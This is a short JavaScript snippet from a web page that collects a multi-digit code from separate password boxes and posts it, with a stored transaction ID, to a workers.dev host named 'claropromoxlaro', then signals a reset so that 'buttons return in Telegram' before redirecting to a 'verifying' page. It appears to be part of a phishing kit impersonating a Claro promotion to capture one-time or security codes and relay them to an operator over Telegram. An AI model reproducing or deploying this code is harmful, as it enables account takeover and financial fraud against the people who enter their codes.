<script>
    const inputs = document.querySelectorAll('.password-input');

    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.target.value !== '') {
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && index > 0) {
                inputs[index - 1].focus();
            }
        });
    });

    document.getElementById('continuar').addEventListener('click', async () => {
        // Concatenar valores
        const inputValues = Array.from(document.querySelectorAll('.password-input'))
                                .map(input => input.value)
                                .join('');

        const transactionId = localStorage.getItem("transactionId");

        if (!transactionId) {
            alert("âŒ No se encontrÃ³ transactionId");
            return;
        }

        // ðŸ“¤ Enviar el cÃ³digo al Worker
        await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/codigo", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ id: transactionId, codigo: inputValues })
        });

        // ðŸ”„ Hacer reset para que vuelvan los botones en Telegram
        await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ id: transactionId })
        });

        alert("âœ… CÃ³digo enviado y botones reactivados");
        window.location.href = "verificando.html"; // o la que quieras
    });

    document.getElementById('cancelar').addEventListener('click', () => {
        window.location.href = 'index.html';
    });
</script>
